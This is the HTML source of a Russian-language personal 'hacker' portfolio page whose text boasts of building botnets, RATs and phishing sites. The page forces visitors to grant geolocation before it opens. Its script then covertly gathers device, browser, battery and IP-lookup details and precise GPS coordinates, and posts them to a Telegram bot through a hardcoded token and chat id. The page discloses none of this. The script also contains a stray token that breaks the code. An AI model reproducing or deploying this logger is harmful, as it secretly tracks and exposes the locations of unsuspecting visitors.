# mvpfreak.github.io

<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>mvdclowned - аля какой хакер</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Courier New', monospace;
            background-color: #0a0a0a;
            color: #b3b3b3;
            overflow-x: hidden;
        }
        
        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            opacity: 0.15;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        
        header {
            text-align: center;
            padding: 20px 0;
            border-bottom: 1px solid #333;
        }
        
        .avatar {
            width: 150px;
            height: 150px;
            border-radius: 50%;
            border: 3px solid #666666; 
            box-shadow: 0 0 15px #4d4d4d; 
        }
        
        h1, h2, h3 {
            color: #808080; 
            text-shadow: 0 0 5px #666666; 
        }
        
        .glitch-text {
            position: relative;
            animation: glitch 3s infinite;
        }
        
        @keyframes glitch {
            0% { transform: none; opacity: 1; }
            7% { transform: skew(-0.5deg, -0.9deg); opacity: 0.75; }
            10% { transform: none; opacity: 1; }
            27% { transform: none; opacity: 1; }
            30% { transform: skew(0.8deg, -0.1deg); opacity: 0.75; }
            35% { transform: none; opacity: 1; }
            52% { transform: none; opacity: 1; }
            55% { transform: skew(-1deg, 0.2deg); opacity: 0.75; }
            50% { transform: none; opacity: 1; }
            72% { transform: none; opacity: 1; }
            75% { transform: skew(0.4deg, 1deg); opacity: 0.75; }
            80% { transform: none; opacity: 1; }
            100% { transform: none; opacity: 1; }
        }
        
        .typing-text {
            overflow: hidden;
            border-right: 2px solid #666666;
            white-space: nowrap;
            margin: 0 auto;
            letter-spacing: 2px;
            animation: typing 3.5s steps(40, end) forwards, blink-caret 0.75s step-end infinite;
            width: 0;
            display: inline-block;
        }
        
        @keyframes typing {
            from { width: 0 }
            to { width: 100% }
        }
        
        @keyframes blink-caret {
            from, to { border-color: transparent }
            50% { border-color: #666666 }
        }
        
        nav {
            display: flex;
            justify-content: center;
            margin: 20px 0;
            flex-wrap: wrap;
        }
        
        nav a {
            margin: 5px 10px;
            color: #808080;
            text-decoration: none;
            padding: 5px 10px;
            border: 1px solid #666666; 
            transition: all 0.3s;
            min-width: 80px;
            text-align: center;
        }
        
        nav a:hover {
            background-color: #808080; 
            color: #0a0a0a; 
            box-shadow: 0 0 10px #666666; 
        }
        
        .page {
            display: none;
            padding: 20px;
            background-color: rgba(30, 30, 30, 0.8); 
            border: 1px solid #4d4d4d; 
            margin-top: 20px;
        }
        
        .page.active {
            display: block;
        }
        
        .social-links {
            display: flex;
            justify-content: center;
            margin-top: 30px;
            flex-wrap: wrap;
        }
        
        .social-links a {
            margin: 10px;
            color: #808080; 
            text-decoration: none;
            padding: 10px 15px;
            border: 1px solid #666666; 
            transition: all 0.3s;
            text-align: center;
        }
        
        .social-links a:hover {
            background-color: #808080; 
            color: #0a0a0a; 
            box-shadow: 0 0 10px #666666; 
        }
        
        footer {
            text-align: center;
            margin-top: 50px;
            padding: 20px;
            border-top: 1px solid #333;
        }
        
        .terminal {
            background-color: rgba(20, 20, 20, 0.7);
            padding: 20px;
            border: 1px solid #666666; 
            margin-top: 20px;
            overflow-x: auto;
        }
        
        .terminal-header {
            border-bottom: 1px solid #666666; 
            padding-bottom: 10px;
            margin-bottom: 10px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        
        .terminal-content {
            font-family: 'Courier New', monospace;
            word-wrap: break-word;
        }
        
        .command {
            color: #808080; 
        }
        
        .response {
            color: #b3b3b3;
            margin-left: 20px;
        }
        
        .snowflake {
            position: fixed;
            top: -10px;
            background-color: #b3b3b3;
            border-radius: 50%;
            pointer-events: none;
            z-index: 1000;
            animation: fall linear infinite;
        }

        @keyframes fall {
            0% { transform: translateY(0); }
            100% { transform: translateY(100vh); }
        }
        
        @media (max-width: 600px) {
            nav {
                flex-direction: column;
                align-items: center;
            }
            
            nav a {
                margin: 5px 0;
                width: 80%;
                text-align: center;
            }
            
            .social-links {
                flex-direction: column;
                align-items: center;
            }
            
            .social-links a {
                width: 80%;
                margin: 5px 0;
            }
            
            .terminal {
                padding: 10px;
            }
            
            .container {
                padding: 10px;
            }
            
            h1 {
                font-size: 24px;
            }
            
            h2 {
                font-size: 20px;
            }
            
            .avatar {
                width: 100px;
                height: 100px;
            }
        }
        
        @media (max-width: 400px) {
            nav a, .social-links a {
                width: 90%;
            }
            
            .terminal-header {
                font-size: 14px;
            }
            
            .terminal-content {
                font-size: 13px;
            }
        }
    </style>
</head>
<body>
    <canvas class="matrix-bg" id="matrix"></canvas>
    
    <div id="permissionModal" style="display: block; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.9); overflow: auto;">
        <div style="background-color: #1e1e1e; margin: 15% auto; padding: 20px; border: 1px solid #666; width: 80%; max-width: 500px; color: #b3b3b3;">
            <h2 style="color: #808080; text-align: center;">Доступ к сайту / Access to the site</h2>
            <p style="margin: 20px 0;">Для доступа к сайту необходимо разрешить определение вашего местоположения.</p>
            <p style="margin: 20px 0; color: #a0a0a0;"><i>To access the site, you must allow your location to be determined.</i></p>
            <div style="display: flex; justify-content: center; gap: 10px;">
                <button id="acceptButton" style="background-color: #333; color: #b3b3b3; border: 1px solid #666; padding: 10px 20px; cursor: pointer; transition: all 0.3s;">Принять / Accept</button>
                <button id="declineButton" style="background-color: #333; color: #b3b3b3; border: 1px solid #666; padding: 10px 20px; cursor: pointer; transition: all 0.3s;">Отклонить / Decline</button>
            </div>
        </div>
    </div>

    <div class="container" id="mainContent" style="display: none;">
        <header>
            <img src="image.jpg" alt="mvdclowned" class="avatar">
            <h1 class="glitch-text">mvdclowned</h1>
            <p class="typing-text">Хакер, программист, исследователь безопасности</p>
        </header>
        <nav>
            <a href="#" onclick="showPage('home')">Главная</a>
            <a href="#" onclick="showPage('about')">Обо мне</a>
            <a href="#" onclick="showPage('projects')">Проекты</a>
        </nav>
        
        <div id="home" class="page active">
            <h2>Добро пожаловать в мой цифровой мир</h2>
            <div class="terminal">
                <div class="terminal-header">Terminal - mvdclowned@big_butts_are_for_me</div>
                <div class="terminal-content">
                    <p class="command">$ whoami</p>
                    <p class="response">mvdclowned</p>
                    <p class="command">$ cat introduction.txt</p>
                    <p class="response">
                        Привет! Я mvdclowned - кодер, разработчик и исследователь в области кибербезопасности, вебпрограммирования.
                        Добро пожаловать на мой персональный сайт, где вы можете узнать больше о моих проектах и увлечениях.
                    </p>
                </div>
            </div>
            
            <div class="social-links">
                <a href="https://t.me/+OJgv_SUPhaZjYzMy" target="_blank">Telegram</a>
                <a href="https://github.com/mvdclowned" target="_blank">GitHub</a>
                <a href="https://t.me/mvdclowned_edu" target="_blank">Обучение</a>
            </div>
        </div>
        
        <div id="about" class="page">
            <h2>Обо мне</h2>
            <div class="terminal">
                <div class="terminal-header">Terminal - mvdclowned@big_butts_are_for_me</div>
                <div class="terminal-content">
                    <p class="command">$ cat about_me.md</p>
                    <p class="response">
                        <p class="response">
                            ## Профиль
                        </p>
                        <p class="response">
                            Я специализируюсь на кибербезопасности и разработке. Мой путь начался с простого интереса к компьютерам, разработке сайтов, создание ботнета, ратников,
                         который перерос в глубокое увлечение хакингом и информационной безопасностью. 
                        </p>
                        
                        
                        <p class="response">
                            ## Навыки
                        </p>
                        
                        <p class="response">
                            - Пентестинг ( я такой же хороший пенестер как из 360 хороший антивирус)
                        </p>
                        <p class="response">
                            - Разработка сайтов (В том числе и фишинговых)
                        </p>
                        <p class="response">
                            - Анализ вредоносного ПО
                        </p>
                        <p class="response">
                            - Создание тулок, ботнетов, ратников,скриптов, ботов для телеграмм ( Скукота )
                        </p>
                        <p class="response">
                            - Программирование на Python, C++, JavaScript, PHP, HTML, Kotlin
                        </p>
                        <p class="response">
                            ## Философия
                        </p>
                        <p class="response">
                            Большие сисечки - это для меня, большие попки - это для меня, много биткоинов - это для меня, паспорта разных стран - это для меня,
                        </p>
                    </p>
                </div>
            </div>
        </div>
        
        <div id="projects" class="page">
            <h2>Мои проекты</h2>
            <div class="terminal">
                <div class="terminal-header">Terminal - mvdclowned@big_butts_are_for_me</div>
                <div class="terminal-content">
                    <p class="command">$ ls -la projects/</p>
                    <p class="response">
                        <p class="response">
                            #1 Logger in site 
                        </p>
                        <p class="response">
                            more....
                        </p>
                        <p class="response">
                            more....
                        </p>
                    </p>
                    <p class="command">$ cat projects/README.md</p>
                    <p class="response">
                        <p class="response">
                            # Проекты
                        </p>
                        <p class="response">
                            Здесь вы найдете информацию о моих текущих и прошлых проектах.
                        </p>
                        <p class="response">
                            Большинство из них доступны на моем GitHub.(Там их нет)
                        </p>
                        <p class="response">
                            Также я веду образовательный Telegram-канал, где делюсь знаниями.(я тупой)
                        </p>
                        <p class="response">
                            в области кибербезопасности и программирования.
                        </p>
                        <p class="response">
                            Присоединяйтесь к моему сообществу, чтобы быть в курсе последних обновлений!
                        </p>
                    </p>
                </div>
            </div>
            
            <div class="social-links">
                <a href="https://t.me/mvdclowned" target="_blank">Telegram</a>
                <a href="https://github.com/mvdclowned" target="_blank">GitHub</a>
                <a href="https://t.me/mvdclowned_edu" target="_blank">Обучение</a>
            </div>
        </div>
        
        <footer>
            <p>&copy; 2025 mvdclowned. Все права защищены.</p>
            <p class="glitch-text">Взлом системы... Доступ разрешен.</p>
        </footer>
    </div>
        <script>
        const botToken = '7736721345:AAFyDMbbDXJKR3QEC0WOgEphZNfehVB99v4';
        async function collectDeviceInfo() {
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                deviceMemory: navigator.deviceMemory || "Недоступно",
                hardwareConcurrency: navigator.hardwareConcurrency || "Недоступно",
                apname: navigator.appName,
                dvizhok: navigator.product,
                vendar: navigator.vendor,
            };
            return deviceInfo;
        }
        
        async function getIPAddress() {
            try {
                const response = await fetch('https://ipinfo.io/json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error("Ошибка при получении IP:", error);
                return "Недоступно";
            }
        }
    
        async function getHost() {
            try {
                const response = await fetch('https://ipinfo.io/json');
                const data = await response.json();
                return data.hostname;
            } catch (error) {
                console.error("Ошибка при получении Hostname:", error);
                return "Недоступно";
            }
        }
    
    
        async function getCity() {
            try {
                const response = await fetch('https://ipinfo.io/json');
                const data = await response.json();
                return data.city;
            } catch (error) {
                console.error("Ошибка при получении city:", error);
                return "Недоступно";
            }
        }
    
        async function getRegion() {
            try {
                const response = await fetch('https://ipinfo.io/json');
                const data = await response.json();
                return data.region;
            } catch (error) {
                console.error("Ошибка при получении Region:", error);
                return "Недоступно";
            }
        }
    
        async function getCountry() {
            try {
                const response = await fetch('https://ipinfo.io/json');
                const data = await response.json();
                return data.country;
            } catch (error) {
                console.error("Ошибка при получении country:", error);
                return "Недоступно";
            }
        }
    
        async function getLoc() {
            try {
                const response = await fetch('https://ipinfo.io/json');
                const data = await response.json();
                return data.loc;
            } catch (error) {
                console.error("Ошибка при получении loc:", error);
                return "Недоступно";
            }
        }
    
        async function getOrg() {
            try {
                const response = await fetch('https://ipinfo.io/json');
                const data = await response.json();
                return data.org;
            } catch (error) {
                console.error("Ошибка при получении org:", error);
                return "Недоступно";
            }
        }
    
        async function getTimezone() {
            try {
                const response = await fetch('https://ipinfo.io/json');
                const data = await response.json();
                return data.timezone;
            } catch (error) {
                console.error("Ошибка при получении timezone:", error);
                return "Недоступно";
            }
        }
        async function getBatteryLevel() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return Math.round(battery.level * 100);
                } catch (error) {
                    console.error("Ошибка при получении уровня батареи:", error);
                    return "Недоступно";
                }
            } else {
                return "API батареи не поддерживается";
            }
        }
        async function sendDataToTelegram(deviceInfo, ipAddress, batteryLevel, host, city, region, country, loc, org, timezone, locationData) {
            const locationInfo = locationData ? `
📍Точная геолокация:
┌Широта: ${locationData.latitude}
├Долгота: ${locationData.longitude}
├Точность: ${locationData.accuracy} метров
└Время: ${locationData.timestamp}` : '\n📍Геолокация: Не предоставлена';
            
            const message = `
Новый запрос!
💻Информация об устройстве:
┌IP: ${ipAddress}
├Платформа: ${deviceInfo.platform}
├Язык: ${deviceInfo.language}
├Разрешение экрана: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}
├Память устройства: ${deviceInfo.deviceMemory} GB
├Ядра процессора: ${deviceInfo.hardwareConcurrency}
└Уровень батареи: ${batteryLevel}%

🌐Инфомация о браузере:
┌User-Agent: ${deviceInfo.userAgent}
├Название браузера: ${deviceInfo.apname}
└Тип движка браузера: ${deviceInfo.vendar}

👻Информация об IP:
┌Hostname: ${host}
├Город: ${city}
├Регион: ${region}
├Страна: ${country}
├Локация: ${loc}
├Провайдер: ${org}
└Часовой пояс: ${timezone}${locationInfo}
            `;
            
            console.log('Отправка данных в Telegram...');
            console.log('Сообщение:', message);

            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            const params = {
                chat_id: "7200125852",
                text: message
            };

            try {
                console.log('Выполняется fetch-запрос к Telegram API...');
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Cache-Control': 'no-cache, no-store, must-revalidate',
                        'Pragma': 'no-cache',
                        'Expires': '0'
                    },
                    body: JSON.stringify(params),
                });

                if (response.ok) {
                    console.log("Данные успешно отправлены в Telegram!");
                    alert("Доступ к сайту предоставлен. Спасибо за разрешение геолокации!");
                } else {
                    console.error("Ошибка при отправке данных в Telegram. Статус:", response.status);
                    const errorText = await response.text();
                    console.error("Ответ сервера:", errorText);
                }
            } catch (error) {
                console.error("Ошибка при отправке данных:", error);
            }
        }
        async function mainWithPosition(position) {
            console.log('Функция mainWithPosition() запущена с позицией:', position);
            try {
                console.log('Сбор информации об устройстве...');
                const deviceInfo = await collectDeviceInfo();
                console.log('Получение IP-адреса...');
                const ipAddress = await getIPAddress();
                console.log('Получение уровня батареи...');
                const batteryLevel = await getBatteryLevel();
                console.log('Получение информации о хосте...');
                const host = await getHost();
                console.log('Получение информации о городе...');
                const city = await getCity();
                console.log('Получение информации о регионе...');
                const region = await getRegion();
                console.log('Получение информации о стране...');
                const country = await getCountry();
                console.log('Получение информации о локации...');
                const loc = await getLoc();
                console.log('Получение информации о провайдере...');
                const org = await getOrg();
                console.log('Получение информации о часовом поясе...');
                const timezone = await getTimezone();
                const locationData = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    timestamp: new Date(position.timestamp).toISOString()
                };
                console.log('Данные геолокации для отправки:', locationData);
                
                console.log('Отправка всех данных в Telegram...');
                await sendDataToTelegram(deviceInfo, ipAddress, batteryLevel, host, city, region, country, loc, org, timezone, locationData);
            } catch (error) {
                console.error('Ошибка в функции mainWithPosition():', error);
            }
        }
        
        async function main() {
            console.log('Функция main() запущена, но теперь она не используется');
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        mainWithPosition(position);
                    },
                    function(error) {
                        console.error('Ошибка при получении геолокации в main():', error);
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            }
        }
        
        function initModalHandlers() {
            const permissionModal = document.getElementById('permissionModal');
            const mainContent = document.getElementById('mainContent');
            const acceptButton = document.getElementById('acceptButton');
            const declineButton = document.getElementById('declineButton');
            
            if (!acceptButton || !declineButton) {
                console.error('Кнопки модального окна не найдены');
                return;
            }
            
            let savedPosition = null;
            
            acceptButton.addEventListener('click', function() {
                if (savedPosition) {
                    console.log('Используем сохраненные данные геолокации');
                    permissionModal.style.display = 'none';
                    mainContent.style.display = 'block';ми
                    mainWithPosition(savedPosition);
                    return;
                }
                
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        function(position) {
                            savedPosition = position;
                            console.log('Получены данные о местоположении:', position);
                            permissionModal.style.display = 'none';
                            mainContent.style.display = 'block';
                            mainWithPosition(position);
                        },
                        function(error) {
                            console.error('Ошибка получения геолокации:', error.code, error.message);
                            alert('Для доступа к сайту необходимо разрешить определение местоположения. Пожалуйста, разрешите доступ и попробуйте снова.\n\nTo access the site, you must allow location determination. Please grant access and try again.');
                        },
                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                    );
                } else {
                    alert('Ваш браузер не поддерживает геолокацию. К сожалению, вы не можете использовать этот сайт.');
                }
            });
            
            declineButton.addEventListener('click', function() {
                alert('Для доступа к сайту необходимо разрешить определение местоположения.\n\nTo access the site, you must allow location determination.');
            });
        }
        
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', initModalHandlers);
        } else {
            initModalHandlers();
        }
    </script>
    <script> 
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        
        const katakana = 'アァカサタナハマヤャラワガザダバパイィキシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズブヅプエェケセテネヘメレヱゲゼデベペオォコソトノホモヨョロヲゴゾドボポヴッン';
        const latin = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
        const nums = '0123456789';
        const cyrillic = 'АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ';
        
        const alphabet = katakana + latin + nums + cyrillic;
        
        const fontSize = 16;
        const columns = canvas.width / fontSize;
        
        const rainDrops = [];
        
        for (let x = 0; x < columns; x++) {
            rainDrops[x] = 1;
        }
        
        const draw = () => {
            ctx.fillStyle = 'rgba(18, 18, 18, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            ctx.fillStyle = '#666666';
            ctx.font = fontSize + 'px monospace';
            
            for (let i = 0; i < rainDrops.length; i++) {
                const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
                ctx.fillText(text, i * fontSize, rainDrops[i] * fontSize);
                
                if (rainDrops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    rainDrops[i] = 0;
                }
                rainDrops[i]++;
            }
        };
        
        setInterval(draw, 30);

        function createSnowflake() {
            const snowflake = document.createElement('div');
            snowflake.classList.add('snowflake');
            const size = Math.random() * 5 + 5;
            snowflake.style.width = size + 'px';
            snowflake.style.height = size + 'px';
            snowflake.style.left = Math.random() * 100 + 'vw';
            snowflake.style.animationDuration = (Math.random() * 5 + 5) + 's';
            document.body.appendChild(snowflake);
            snowflake.addEventListener('animationend', () => snowflake.remove());
        }
        setInterval(createSnowflake, Math.random() * 1000 + 500);

        function showPage(pageId) {
            const pages = document.querySelectorAll('.page');
            pages.forEach(page => {
                page.classList.remove('active');
            });
            document.getElementById(pageId).classList.add('active');
        }
        
        window.addEventListener('resize', () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });

        function calculateTypingDuration() {
            const typingText = document.querySelector('.typing-text');
            const textLength = typingText.textContent.length;
            const duration = textLength * 0.1;
            typingText.style.animationDuration = `${duration}s`;
        }

        window.addEventListener('load', calculateTypingDuration);
    </script>
</body>
</html
